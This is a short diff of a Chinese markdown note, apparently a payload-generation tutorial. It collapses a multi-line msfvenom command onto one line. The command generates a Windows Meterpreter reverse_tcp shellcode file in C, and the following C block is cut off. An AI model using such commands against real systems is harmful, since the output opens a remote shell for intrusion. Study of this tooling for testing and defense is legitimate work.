@@ -1,12 +1,7 @@
 ## 1. 生成
 
 ```bash
-msfvenom -a x86 \
-	--platform windows \
-	-p windows/meterpreter/reverse_tcp \
-	LHOST=127.0.0.1 \
-	LPORT=12345 \
-	-f c > payload.c
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=12345 -f c > payload.c
 ```
 
 ```c
